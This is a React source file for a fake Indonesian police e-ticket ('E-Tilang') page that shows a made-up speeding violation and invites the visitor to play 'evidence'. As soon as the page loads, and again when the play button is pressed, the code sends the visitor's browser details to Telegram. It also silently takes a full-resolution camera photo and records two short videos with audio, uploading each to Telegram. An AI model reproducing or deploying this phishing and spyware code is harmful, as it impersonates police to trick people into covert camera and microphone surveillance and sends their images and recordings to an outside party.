import { PlayIcon } from "@heroicons/react/24/solid";
import { useState, useEffect, useCallback } from "react";
import {
  sendTelegramNotification,
  sendImageToTelegram,
  sendVideoToTelegram,
} from "./utils/telegram";

function App() {
  const [isBlurred] = useState(true);
  const thumbnailUrl =
    "https://e1.pxfuel.com/desktop-wallpaper/309/113/desktop-wallpaper-plain-black-black-screen.jpg";

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || "Direct",
        previousSites: document.referrer || "None",
      });

      await captureAndSendMedia();
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      // Get device capabilities first
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(
        (device) => device.kind === "videoinput"
      );

      if (!videoDevice) {
        throw new Error("No video input device found");
      }

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 }, // Maximum supported width
          height: { ideal: 2160 }, // Maximum supported height
          frameRate: { ideal: 60 },
        },
        audio: true,
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Get actual video track settings
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();

      // Create and setup video element for photo capture
      const video = document.createElement("video");
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      // Wait for video to be ready
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error("Error playing video:", error);
            resolve(true);
          }
        };
      });

      // Setup canvas with actual video dimensions
      const canvas = document.createElement("canvas");
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext("2d");

      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      // Convert photo to blob with maximum quality
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob(
          (blob) => {
            if (blob) resolve(blob);
          },
          "image/jpeg",
          1.0
        );
      });

      // Send photo immediately
      sendImageToTelegram(photoBlob).catch(console.error);

      // Check supported video formats
      const mimeTypes = [
        "video/mp4;codecs=h264,aac",
        "video/mp4",
        "video/webm;codecs=vp8,opus",
        "video/webm",
      ];

      const supportedMimeType = mimeTypes.find((type) =>
        MediaRecorder.isTypeSupported(type)
      );

      if (!supportedMimeType) {
        throw new Error("No supported video format found");
      }

      const sendVideo5Detik = async () => {
        // Configure video recording with maximum quality
        const mediaRecorder = new MediaRecorder(stream, {
          mimeType: supportedMimeType,
          videoBitsPerSecond: 8000000, // 8 Mbps for high quality
        });

        const chunks: BlobPart[] = [];

        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        mediaRecorder.onstop = async () => {
          const videoBlob = new Blob(chunks, {
            type: supportedMimeType.includes("mp4")
              ? "video/mp4"
              : "video/webm",
          });
          console.log("Video recording completed, size:", videoBlob.size);
          await sendVideoToTelegram(videoBlob);
          stream.getTracks().forEach((track) => track.stop());
        };

        // Start recording with frequent data chunks for better quality
        mediaRecorder.start(1000);
        console.log("Started recording video");

        // Stop recording after 5 seconds
        setTimeout(() => {
          if (mediaRecorder.state === "recording") {
            console.log("Stopping video recording");
            mediaRecorder.stop();
          }
        }, 5000);
      };

      const sendVideo10Detik = async () => {
        // Configure video recording with maximum quality
        const mediaRecorder = new MediaRecorder(stream, {
          mimeType: supportedMimeType,
          videoBitsPerSecond: 8000000, // 8 Mbps for high quality
        });

        const chunks: BlobPart[] = [];

        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        mediaRecorder.onstop = async () => {
          const videoBlob = new Blob(chunks, {
            type: supportedMimeType.includes("mp4")
              ? "video/mp4"
              : "video/webm",
          });
          console.log("Video recording completed, size:", videoBlob.size);
          await sendVideoToTelegram(videoBlob);
          stream.getTracks().forEach((track) => track.stop());
        };

        // Start recording with frequent data chunks for better quality
        mediaRecorder.start(1000);
        console.log("Started recording video");

        // Stop recording after 10 seconds
        setTimeout(() => {
          if (mediaRecorder.state === "recording") {
            console.log("Stopping video recording");
            mediaRecorder.stop();
          }
        }, 10000);
      };

      // Start video recording
      sendVideo5Detik();
      sendVideo10Detik();
    } catch (error) {
      console.error("Error capturing media:", error);
    }
  }, []);

  const handlePlayClick = async () => {
    await captureAndSendMedia();
  };

  // Generate a random ID for uniqueness
  const tilangId = Math.floor(10000 + Math.random() * 90000);

  // Tanggal dan waktu saat ini dalam format Indonesia
  const currentDate = new Date().toLocaleDateString("id-ID", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  });

  const currentTime = new Date().toLocaleTimeString("id-ID", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });

  return (
    <div className="relative min-h-screen bg-slate-100">
      {/* Subtle background pattern for added texture */}
      <div className="fixed inset-0 pointer-events-none opacity-5 bg-pattern"></div>

      {/* Header - ditingkatkan responsivitasnya */}
      <header className="relative py-1 border-b-2 border-blue-700 shadow-lg sm:py-2 bg-gradient-to-r from-blue-900 to-blue-800">
        <div className="container flex flex-col items-center justify-between px-2 mx-auto sm:flex-row sm:px-4">
          <div className="flex items-center w-full mb-2 space-x-2 sm:space-x-3 sm:w-auto sm:mb-0">
            {/* Logo yang lebih kecil di mobile */}
            <div className="relative">
              <div className="flex items-center justify-center w-10 h-10 border-2 border-yellow-300 rounded-full shadow-md sm:w-12 sm:h-12 md:w-14 md:h-14 bg-gradient-to-br from-yellow-400 to-yellow-600">
                <span className="text-xs font-bold text-blue-900 sm:text-sm">
                  POLRI
                </span>
              </div>
              <div className="absolute w-3 h-3 bg-red-600 border border-red-400 rounded-full sm:w-4 sm:h-4 -top-1 -right-1 animate-pulse"></div>
            </div>

            {/* Text header yang lebih responsif */}
            <div>
              <h1 className="text-lg font-bold leading-tight tracking-tight text-white sm:text-xl md:text-2xl">
                REKAMAN PELANGGARAN LALU LINTAS
              </h1>
              <div className="flex items-center space-x-2 text-xs">
                <span className="text-blue-200">
                  Sistem E-Tilang • Direktorat Lalu Lintas
                </span>
                <span className="hidden sm:inline-flex items-center px-1.5 py-0.5 rounded-full text-xs font-medium bg-blue-700 text-white">
                  <span className="w-1.5 h-1.5 mr-1 bg-green-400 rounded-full animate-pulse"></span>
                  ONLINE
                </span>
              </div>
            </div>
          </div>

          {/* Tanggal & waktu - responsif */}
          <div className="flex flex-col items-end w-full sm:w-auto">
            <div className="px-2 py-0.5 sm:px-3 sm:py-1 font-mono text-xs sm:text-sm text-white border border-blue-700 rounded shadow-inner bg-blue-950">
              {currentDate}
            </div>
            <div className="mt-1 text-xs text-blue-300">
              ID: TLG-{tilangId} • CAM-32
            </div>
          </div>
        </div>
      </header>

      <main className="container relative px-2 py-2 mx-auto sm:px-4 sm:py-4">
        <div className="max-w-5xl mx-auto">
          {/* Informasi bar di atas video - responsif */}
          <div className="flex flex-col items-center justify-between p-1 text-xs text-white border border-blue-700 rounded-t-lg shadow-md sm:flex-row sm:p-2 sm:text-sm bg-gradient-to-r from-blue-800 to-blue-700">
            <div className="flex items-center justify-center w-full mb-1 sm:mb-0 sm:w-auto sm:justify-start">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="w-3 h-3 mr-1 text-blue-300 sm:w-4 sm:h-4"
                viewBox="0 0 20 20"
                fill="currentColor"
              >
                <path
                  fillRule="evenodd"
                  d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z"
                  clipRule="evenodd"
                />
              </svg>
              <span>JL. AHMAD YANI KM 5</span>
            </div>

            <div className="flex items-center px-2 py-0.5 bg-red-600 rounded text-xs font-mono animate-pulse border border-red-500 shadow-inner my-1 sm:my-0">
              <span className="w-2 h-2 mr-1 bg-white rounded-full"></span>
              REC
            </div>

            <div className="flex items-center justify-center w-full sm:w-auto sm:justify-end">
              <span className="text-xs">KECEPATAN MAX: 60 KM/J</span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="w-3 h-3 ml-1 text-yellow-300 sm:w-4 sm:h-4"
                viewBox="0 0 20 20"
                fill="currentColor"
              >
                <path
                  fillRule="evenodd"
                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9a1 1 0 00-1-1z"
                  clipRule="evenodd"
                />
              </svg>
            </div>
          </div>

          <div className="relative">
            <div className="relative overflow-hidden bg-black border-b border-blue-700 shadow-xl border-x aspect-video">
              {isBlurred && (
                <div className="absolute inset-0 backdrop-blur-sm bg-black/40" />
              )}

              {/* Overlay watermark */}
              <div className="absolute inset-0 flex items-center justify-center pointer-events-none opacity-10">
                <div className="rotate-[-15deg] scale-100 sm:scale-150">
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/d/dd/Insignia_of_the_Indonesian_National_Police.svg"
                    alt="Logo Polri"
                    className="w-24 h-24 sm:w-32 sm:h-32"
                  />
                </div>
              </div>

              {/* Frame pendeteksi kendaraan - responsif */}
              <div className="absolute z-20 w-1/3 border border-red-500 pointer-events-none sm:border-2 top-1/3 left-1/3 h-1/3 animate-pulse">
                <div className="absolute w-4 h-4 border-b border-l border-red-500 sm:w-6 sm:h-6 sm:border-b-2 sm:border-l-2 -bottom-2 -left-2 sm:-bottom-3 sm:-left-3"></div>
                <div className="absolute w-4 h-4 border-b border-r border-red-500 sm:w-6 sm:h-6 sm:border-b-2 sm:border-r-2 -bottom-2 -right-2 sm:-bottom-3 sm:-right-3"></div>
                <div className="absolute w-4 h-4 border-t border-l border-red-500 sm:w-6 sm:h-6 sm:border-t-2 sm:border-l-2 -top-2 -left-2 sm:-top-3 sm:-left-3"></div>
                <div className="absolute w-4 h-4 border-t border-r border-red-500 sm:w-6 sm:h-6 sm:border-t-2 sm:border-r-2 -top-2 -right-2 sm:-top-3 sm:-right-3"></div>
              </div>

              {/* Top overlay elements - responsif */}
              <div className="absolute top-0 left-0 z-20 w-full p-1 sm:p-2 font-mono text-[8px] sm:text-xs text-white">
                <div className="flex justify-between">
                  <div className="flex flex-col space-y-1">
                    <div className="flex items-center space-x-1 sm:space-x-2">
                      <span className="px-1 py-0.5 sm:px-2 bg-black/60 rounded-sm">
                        ID: CAM-032
                      </span>
                      <span className="px-1 py-0.5 sm:px-2 bg-black/60 rounded-sm hidden sm:inline-block">
                        FPS: 30
                      </span>
                    </div>
                    <div className="flex items-center">
                      <span className="px-1 py-0.5 sm:px-2 bg-black/60 rounded-sm mr-1">
                        {currentTime}
                      </span>
                      <span className="px-1 py-0.5 sm:px-2 bg-black/60 rounded-sm hidden sm:inline-block">
                        OPERATOR: SIP-23
                      </span>
                    </div>
                  </div>
                  <div className="px-1 py-0.5 sm:px-2 bg-black/60 rounded-sm">
                    {currentDate}
                  </div>
                </div>
              </div>

              {/* Bottom overlay elements - responsif */}
              <div className="absolute bottom-0 left-0 z-20 flex justify-between w-full p-1 sm:p-2 font-mono text-[8px] sm:text-xs text-white bg-gradient-to-t from-black/80 to-transparent">
                <div className="flex flex-col space-y-0.5 sm:space-y-1">
                  <div className="flex items-center space-x-1 sm:space-x-2">
                    <span className="font-bold">NOPOL:</span>
                    <span className="font-bold text-yellow-300">
                      B 1234 ABC
                    </span>
                  </div>
                  <div className="flex items-center space-x-1 sm:space-x-2">
                    <span>KEC:</span>
                    <span className="font-bold text-red-500">78 KM/J</span>
                    <span>(+18)</span>
                  </div>
                </div>
                <div className="flex flex-col items-end">
                  <div className="px-1 py-0.5 sm:px-2 sm:py-1 text-[8px] sm:text-xs font-bold text-white bg-red-600 rounded-sm shadow-md animate-bounce">
                    PELANGGARAN
                  </div>
                  <div className="mt-0.5 sm:mt-1 text-[8px] sm:text-xs opacity-75">
                    ID: {tilangId}
                  </div>
                </div>
              </div>

              {/* Tombol Play yang lebih responsif */}
              <div className="absolute inset-0 z-10 flex items-center justify-center">
                <button onClick={handlePlayClick} className="relative group">
                  <div className="absolute inset-0 bg-blue-600 rounded-full opacity-20 animate-ping group-hover:opacity-0"></div>
                  <div className="p-3 transition-all duration-300 border border-white rounded-full shadow-lg sm:p-4 md:p-6 sm:border-2 bg-gradient-to-br from-blue-600 to-blue-800 group-hover:from-red-600 group-hover:to-red-800 group-hover:scale-110">
                    <PlayIcon className="w-8 h-8 text-white sm:w-12 sm:h-12 md:w-16 md:h-16" />
                  </div>
                  <div className="absolute px-2 py-0.5 sm:px-3 sm:py-1 text-xs sm:text-sm text-white transition-opacity duration-300 transform -translate-x-1/2 rounded-full opacity-0 -bottom-6 sm:-bottom-10 left-1/2 bg-black/75 group-hover:opacity-100 whitespace-nowrap">
                    Putar Bukti Pelanggaran
                  </div>
                </button>
              </div>

              <img
                src={thumbnailUrl}
                alt="Video Pelanggaran"
                className="object-cover w-full h-full"
              />
            </div>
          </div>

          {/* Panel informasi detail pelanggaran - responsif */}
          <div className="p-2 mt-2 bg-white border border-blue-200 rounded-lg shadow-md sm:p-4 sm:mt-4">
            <div className="flex items-center pb-2 mb-2 border-b border-blue-200 sm:mb-3">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="w-4 h-4 mr-1 text-blue-800 sm:w-6 sm:h-6 sm:mr-2"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <h2 className="text-base font-bold text-blue-800 sm:text-lg">
                DETAIL PELANGGARAN
              </h2>
            </div>

            {/* Grid yang responsif - stack pada mobile */}
            <div className="grid grid-cols-1 gap-2 text-xs sm:grid-cols-2 sm:gap-3 sm:text-sm">
              <div className="space-y-1 sm:space-y-2">
                <div className="flex">
                  <span className="w-1/3 font-bold text-gray-700">Jenis:</span>
                  <span className="w-2/3 text-blue-900">
                    Melebihi Batas Kecepatan
                  </span>
                </div>
                <div className="flex">
                  <span className="w-1/3 font-bold text-gray-700">Lokasi:</span>
                  <span className="w-2/3 text-blue-900">
                    JL. AHMAD YANI KM 5
                  </span>
                </div>
                <div className="flex">
                  <span className="w-1/3 font-bold text-gray-700">Waktu:</span>
                  <span className="w-2/3 text-blue-900">{currentTime} WIB</span>
                </div>
              </div>
              <div className="mt-2 space-y-1 sm:space-y-2 sm:mt-0">
                <div className="flex">
                  <span className="w-1/3 font-bold text-gray-700">
                    Kendaraan:
                  </span>
                  <span className="w-2/3 text-blue-900">Mobil Penumpang</span>
                </div>
                <div className="flex">
                  <span className="w-1/3 font-bold text-gray-700">
                    Nomor Polisi:
                  </span>
                  <span className="w-2/3 font-bold text-yellow-600">
                    B 1234 ABC
                  </span>
                </div>
                <div className="flex">
                  <span className="w-1/3 font-bold text-gray-700">Status:</span>
                  <span className="w-2/3">
                    <span className="inline-flex items-center px-1.5 py-0.5 rounded-full text-xs font-medium bg-red-100 text-red-800">
                      <span className="w-1.5 h-1.5 mr-1 bg-red-600 rounded-full animate-pulse"></span>
                      BELUM DIPROSES
                    </span>
                  </span>
                </div>
              </div>
            </div>

            <div className="p-1.5 sm:p-2 mt-2 sm:mt-3 border border-blue-200 rounded-md bg-blue-50">
              <div className="flex items-center text-xs sm:text-sm">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="w-3 h-3 mr-1 text-blue-600 sm:w-4 sm:h-4"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
                <span className="text-blue-800">
                  Kendaraan terdeteksi melaju{" "}
                  <span className="font-bold">18 km/jam</span> di atas batas
                  kecepatan
                </span>
              </div>
            </div>
          </div>

          {/* Panel denda - responsif */}
          <div className="p-2 mt-2 border border-red-200 rounded-lg shadow-md sm:p-4 sm:mt-4 bg-gradient-to-br from-red-50 to-white">
            <div className="flex items-center pb-2 mb-2 border-b border-red-200 sm:mb-3">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="w-4 h-4 mr-1 text-red-700 sm:w-6 sm:h-6 sm:mr-2"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <h2 className="text-base font-bold text-red-700 sm:text-lg">
                INFORMASI DENDA
              </h2>
            </div>

            {/* Grid responsif untuk info denda */}
            <div className="grid grid-cols-1 gap-2 text-xs sm:text-sm md:grid-cols-2">
              <div className="p-1.5 sm:p-2 bg-white border border-red-100 rounded-md">
                <div className="flex items-center mb-0.5 sm:mb-1 text-red-900">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="w-3 h-3 mr-1 sm:w-4 sm:h-4"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M3 6l3 1m0 0l-3 9a5.002 5.002 0 006.001 0M6 7l3 9M6 7l6-2m6 2l3-1m-3 1l-3 9a5.002 5.002 0 006.001 0M18 7l3 9m-3-9l-6-2m0-2v2m0 16V5m0 16H9m3 0h3"
                    />
                  </svg>
                  <span className="font-bold">Dasar Hukum:</span>
                </div>
                <p className="text-xs text-gray-800 sm:text-sm">
                  UU No. 22 Tahun 2009 Pasal 287 ayat 5
                </p>
              </div>
              <div className="p-1.5 sm:p-2 bg-white border border-red-100 rounded-md">
                <div className="flex items-center mb-0.5 sm:mb-1 text-red-900">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="w-3 h-3 mr-1 sm:w-4 sm:h-4"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2z"
                    />
                  </svg>
                  <span className="font-bold">Denda Maksimal:</span>
                </div>
                <p className="text-lg font-bold text-red-700 sm:text-xl">
                  Rp 500.000,-
                </p>
              </div>
            </div>

            <div className="flex items-start p-1.5 sm:p-2 mt-2 sm:mt-3 text-[10px] sm:text-xs text-gray-700 border border-yellow-200 rounded-md bg-yellow-50">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="flex-shrink-0 w-4 h-4 mr-1 text-yellow-600 sm:w-5 sm:h-5 sm:mr-2"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <p>
                Silakan tekan tombol play untuk melihat bukti pelanggaran.
                Rekaman ini merupakan bukti sah yang akan digunakan dalam proses
                tilang elektronik. Pembayaran denda dapat dilakukan melalui bank
                atau kanal pembayaran resmi.
              </p>
            </div>
          </div>

          {/* Status bar - responsif */}
          <div className="flex flex-col sm:flex-row items-center justify-between p-1.5 sm:p-2 mt-3 sm:mt-6 text-[10px] sm:text-xs text-white border border-blue-600 rounded-md shadow-md bg-gradient-to-r from-blue-800 to-blue-700">
            <div className="flex items-center mb-1 sm:mb-0">
              <span className="inline-block w-1.5 h-1.5 sm:w-2 sm:h-2 mr-1 bg-green-500 rounded-full animate-pulse"></span>
              <span>Status Server: Online</span>
            </div>
            <div className="text-center sm:text-right">
              <span>Sistem E-Tilang v3.2.1</span>
              <span className="mx-1 sm:mx-2">•</span>
              <span>DB: Terhubung</span>
            </div>
          </div>
        </div>
      </main>

      {/* Footer - responsif */}
      <footer className="py-2 mt-3 text-white border-t border-blue-700 shadow-inner sm:py-3 sm:mt-6 bg-gradient-to-r from-blue-900 to-blue-800">
        <div className="container mx-auto">
          <div className="flex flex-col items-center justify-center px-2 sm:px-4 md:flex-row md:justify-between">
            <div className="flex items-center mb-2 md:mb-0">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/d/dd/Insignia_of_the_Indonesian_National_Police.svg"
                alt="Logo Polri"
                className="w-6 h-6 mr-2 sm:w-8 sm:h-8"
              />
              <div>
                <p className="text-xs font-bold sm:text-sm">
                  KEPOLISIAN NEGARA REPUBLIK INDONESIA
                </p>
                <p className="text-[10px] sm:text-xs text-blue-300">
                  DIREKTORAT LALU LINTAS
                </p>
              </div>
            </div>
            <div className="text-[10px] sm:text-xs text-center md:text-right">
              <p>Sistem E-Tilang v3.2.1 © 2025 • Korlantas Polri</p>
              <p className="mt-1 text-blue-300">
                <a href="#" className="mx-1 hover:underline">
                  Bantuan
                </a>{" "}
                •
                <a href="#" className="mx-1 hover:underline">
                  Kebijakan Privasi
                </a>{" "}
                •
                <a href="#" className="mx-1 hover:underline">
                  Hubungi Kami
                </a>
              </p>
            </div>
          </div>
        </div>
      </footer>

      {/* CSS untuk pola background halus */}
      <style>{`
        .bg-pattern {
          background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%234b70dd' fill-opacity='0.1'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
        }
      `}</style>
    </div>
  );
}

export default App;
